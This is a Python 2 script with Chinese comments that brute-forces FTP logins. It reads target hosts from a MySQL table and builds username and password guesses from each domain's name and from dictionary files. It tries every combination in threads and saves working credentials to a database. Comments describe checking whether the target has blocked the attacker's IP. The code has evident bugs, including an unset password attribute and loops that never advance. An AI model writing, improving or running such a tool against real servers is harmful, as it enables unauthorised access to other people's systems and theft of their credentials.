#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
####################################################################
#qq:316118740
#BLOG:http://hi.baidu.com/alalmn
from ftplib import FTP
import time
import list
####################################################################
#密码组合
def str_index(data1,data2):  #查找字符
    try:
        data1.index(data2)
        return 0
    except:
        return 1

def www_cj(sStr1):  #域名拆解
    LS.liet_add(sStr1+sStr1)
    sStr2 = "."
    LS.liet_add(sStr1)
    d1 = sStr1[0:sStr1.find(sStr2)]
    #print "11111",d1
    LS.liet_add(d1)
    LS.liet_add(d1+d1)
    sStr1 = sStr1[sStr1.find(sStr2)+1:]
    #print "2222",sStr1
    LS.liet_add(sStr1)
    LS.liet_add(sStr1+sStr1)
    if str_index(sStr1,sStr2):
        return 0
        #print "1111111111没有"
    else:
        #print "2222222222有了"
        d2 = sStr1[0:sStr1.find(sStr2)]
        #print d2
        LS.liet_add(d2)
        LS.liet_add(d2+d2)
        sStr1 = sStr1[sStr1.find(sStr2)+1:]
        #print sStr1
        LS.liet_add(sStr1)
        LS.liet_add(sStr1+sStr1)
        if str_index(sStr1,sStr2):
            return 0
            #print "222222没有"
        else:
            #print "2222222222有了"
            d3 = sStr1[0:sStr1.find(sStr2)]
            #print d3
            LS.liet_add(d3)
            LS.liet_add(d3+d3)
            sStr1 = sStr1[sStr1.find(sStr2)+1:]
            #print sStr1
            LS.liet_add(sStr1)
            LS.liet_add(sStr1+sStr1)
            if str_index(sStr1,sStr2):
                return 0
                #print "33333没有"
            else:
                #print "2222222222有了"
                d4 = sStr1[0:sStr1.find(sStr2)]
                #print d4
                LS.liet_add(d4)
                LS.liet_add(d4+d4)
                sStr1 = sStr1[sStr1.find(sStr2)+1:]
                #print sStr1
                LS.liet_add(sStr1)
                LS.liet_add(sStr1+sStr1)
                if str_index(sStr1,sStr2):
                    return 0
                    #print "44444没有"
                else:
                    #print "2222222222有了"
                    d5 = sStr1[0:sStr1.find(sStr2)]
                    #print d5
                    LS.liet_add(d5)
                    LS.liet_add(d5+d5)
                    sStr1 = sStr1[sStr1.find(sStr2)+1:]
                    #print sStr1
                    LS.liet_add(sStr1)
                    LS.liet_add(sStr1+sStr1)
                    if str_index(sStr1,sStr2):
                        return 0
                        #print "55555没有"

def open_txt():  #打开TXT文本写入数组
    try:
        xxx = file('admin.txt', 'r')
        for xxx_line in xxx.readlines():
            LS.liet_add(xxx_line)
        xxx.close()
    except:
        print u"目录下admin.txt密码本不存在"
        return 0
##################
def get_sdomain(domain):  #域名拆解www.baidu.com->baidu.com
    suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'
    sdomain = []
    bdomain = False
    for section in domain.split('.'):
        if section in suffixes:
            sdomain.append(section)
            bdomain = True
        else:
            sdomain = [section]
    return '.'.join(sdomain) if bdomain  else ''

def get_ssdomain(domain):  #域名拆解www.baidu.com->baidu
    sdomain = get_sdomain(domain)  #先解析一道
    ssdomian = sdomain.partition('.')[0] if sdomain else ''
    return ssdomian

from collections import defaultdict, deque
def FTP_username(host):  #导入密码组合方式
    try:
        accounts =deque()   #list数组
    #得到sdomain和ssdomain
        domain = host
        sdomain = get_sdomain(domain)  #域名拆解www.baidu.com->baidu.com
        ssdomain = get_ssdomain(domain)  #域名拆解www.baidu.com->baidu
        user = file('username.dic','r')
        for username in user.readlines():
            if  '%domain%' in username or '%sdomain%' in username or '%ssdomain%' in username:
                if sdomain=='':
                    continue  #跳过
                else:
                    username = username.replace('%domain%',domain)  #返回根据正则表达式进行文字替换后的字符串的复制
                    #LS.liet_add(username)
                    username = username.replace('%sdomain%',sdomain)
                    #LS.liet_add(username)
                    username = username.replace('%ssdomain%',ssdomain)
                    #LS.liet_add(username)

            LS.liet_add(username)

        user.close()

        pass2 = file('password.dic','r')
        for password in pass2.readlines():
            if '%domain%' in password or '%sdomain%' in password or '%ssdomain%' in password:
                if sdomain=='':
                    continue  #跳过
                else:
                    password = password.replace('%domain%',domain)
                    #LS.liet_add(password)
                    password = password.replace('%sdomain%',sdomain)
                    #LS.liet_add(password)
                    password = password.replace('%ssdomain%',ssdomain)
                    #LS.liet_add(password)

            password = password.replace('%null%','')
            LS.liet_add(password)
            password = password.replace('%username%',username)
            LS.liet_add(password)

        pass2.close()

    except:
        print u"导入密码组合方式异常目录下可能是无password.dic/username.dic文件"
        return 0
####################################################################
from ftplib import FTP
import socket
import threading,time
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
#要添加这个  检测过程充分考虑了部分FTP Server的错误阈值       要写上去
#def ftp_open(host,user,passwd,port=21):  #打开FTP
#    try:
#        ftp = FTP(host)
#        ftp.connect(host,port)  #连接 服务器名  端口号
#        ftp.login(user,passwd)
#        ftp.quit()  #ftpB.quit() #退出ftp服务器
#        return 1
#    except:
#        return 0
class ftp_open(threading.Thread):
    def __init__(self,cond,host,user,pwd):
        super(ftp_open, self).__init__()
        self.Chost=host
        self.Cport=21
        self.Cuser=user
        self.Cpwd=pwd
    def run(self):
        try:
            #print u"\nIP:",self.Chost,u"用户名:",self.Cuser,u"密码:",self.Cpasswd
            ftp = FTP(self.Chost)
            ftp.connect(self.Chost,self.Cport)  #连接 服务器名  端口号
            ftp.login(self.Cuser,self.Cpasswd)
            ftp.quit()  #ftpB.quit() #退出ftp服务器
            ##############################
            print u"\nIP:",self.Chost,u"用户名:",self.Cuser,u"密码:",self.Cpasswd,u"连接成功"
            sql = "insert into ftppassword(IP,user,password,time) values('%s','%s','%s','%s')"%(self.Chost,self.Cuser,self.Cpasswd,time.strftime('%Y.%m.%d-%H.%M.%S'))
            #print sql
            mysql.mysql_insert(sql) #添加到数据库
            mysql.mysql_S()  #保存数据
            ##############################
            #return 1
        except:
            print u".",
            return 0


def link_ftp(host):  #TXT导入数组    组合密码    遍历连接FTP
    ######  遍历数组组合出 密码
    try:
        intls=len(LS.list_2)
        p_p_p = 0 #心跳包计数器
        I1 = 0 #得到list的第一个元素
        while I1 < len(LS.list_2):
            #print "第几组密码：",I1
            if LS.list_2[I1]=='':
                continue  #跳过
            if I1==len(LS.list_2):
                break  #退出循环
            I2 = 0 #得到list的第一个元素

            while I2 < len(LS.list_2):
                if LS.list_2[I2]=='':
                    continue  #跳过
                ###########################
                #当做心跳包使用  如果检测不到了  还能连接就退出
                #防止人家屏蔽IP   10次检测一次心跳
                try:
                    if p_p_p>=50:
                        print "_-_",
                        ftpB = FTP()  #初始化FTP类
                        ftpB.connect(host,21)  #连接 服务器名  端口号
                        ftpB.quit() #退出ftp服务器
                        p_p_p=0
                    p_p_p=p_p_p+1
                except:
                    print u"检测心跳包----心跳停止"
                    sql_sel()   #SQL查询
                    return 0
                ###########################
                #print u"IP:",host,u"用户名:",LS.list_2[I1],u"密码:",LS.list_2[I2]
                time.sleep(0.1) #确保先运行Seeker中的方法
                cond = threading.Event()
                hider = ftp_open(cond,host,LS.list_2[I1],LS.list_2[I2])
                hider.start()
                #print u".",
                I2 = I2 + 1  #二层
            I1 = I1 + 1   #一层
        sql_sel() #SQL查询
    except:
        print u"遍历数组组合出 密码错误"
        sql_sel()   #SQL查询
        return 0

####################################################################
def www_port(host,port=21):  #查看21端口是否开放
    try:
        if host == '':  #传入值等于空   返回
            print u"地址不能为空"
            time.sleep(3) #确保先运行Seeker中的方法
            #linkftp.sql_sel()   #SQL查询
            return 0
        LS.list_del()  #清空list列表
        ###############查看21端口是否开放
        ftpA = FTP()  #初始化FTP类
        ftpA.connect(host,port)  #连接 服务器名  端口号
        ftpA.quit() #退出ftp服务器
        #################
        #sql_up(host,"send") #SQL修改数据
        if ~sql_up(host,"send"):   #多个程序开启的时候  防止重复扫
        ################开放了在组合密码最后开始爆破
            www_cj(host)  #域名拆解
            open_txt()  #打开TXT文本写入数组
            FTP_username(host)  #导入密码组合方式
            LS.liet_lsqc() #数组列表去重复
            print u"数组数据量：",len(LS.list)
            intps=len(LS.list_2)
            print u"数组数据量去掉重复：",intps
            print u"组合出%d*%d=%s 次密码" %(intps,intps,intps*intps)
            print u"扫描网站FTP:%s 开始"%(host),
            link_ftp(host)  #TXT导入数组    组合密码    遍历连接FTP
        else:
            sql_sel()   #SQL查询

#        E = 0 #得到list的第一个元素
#        while E < len(LS.list_2):
#            print "\n",LS.list_2[E],
#            E = E + 1
    except Exception, e:
        print host,u"服务器FTP21端口可能没有开放",
        sql_up(host,"no21") #SQL修改数据
        sql_sel()   #SQL查询
        return 0
####################################################################
import mysql #数据库操作文件
import time
import random  #产生一个随机数
def sql_up(url,data): #SQL修改数据
    try:
        up = "update  ftp set  ftpsend='%s' where url='%s'"%(data.encode('utf-8'),url)
        if mysql.mysql_update(up):  #修改数据
            print url,u"修改数据库成功\n"
            mysql.mysql_S()  #保存数据
            a=random.randrange(1,4)   #产生一个随机数8以内的
            time.sleep(a) #确保先运行Seeker中的方法
            return 1
        else:
            print url,u"修改数据库失败\n"
            mysql.mysql_S()  #保存数据
            b=random.randrange(5,15)   #产生一个随机数8以内的
            time.sleep(b) #确保先运行Seeker中的方法
            return 0
        #mysql.mysql_S()  #保存数据
    except:
        return 0

def sql_sel(): #SQL查询
    try:
        a=random.randrange(1,8)   #产生一个随机数8以内的
        time.sleep(a) #确保先运行Seeker中的方法
        sql="select * from ftp where ftpsend is NULL limit 1"
        mysql.cursor.execute(sql)
        mysql.cursor.scroll(0)
        for row in mysql.cursor.fetchall():
            www_port(row[0])  #www转换IP在查看端口
    except:
        print u"SQL读取URL异常！！！！！"
####################################################################
####################################################################
if __name__=='__main__': 
    global LS
    LS = list.Clist()  #初始化类
    mysql.mysql_open()  #连接数据库
    sql_sel()   #SQL查询

#    #www= "90money.com"
#    host= "127.0.0.1"
#    www_cj(host)  #域名拆解
#    open_txt()  #打开TXT文本写入数组
#    FTP_username(host)  #导入密码组合方式
#    LS.liet_lsqc() #数组列表去重复
#    print u"数组数据量：",len(LS.list)
#    intps=len(LS.list_2)
#    print u"数组数据量去掉重复：",intps
#    print u"组合出%d*%d=%s 次密码" %(intps,intps,intps*intps)
#    print u"扫描网站FTP:%s 开始"%(host),
#    link_ftp(host)  #TXT导入数组    组合密码    遍历连接FTP

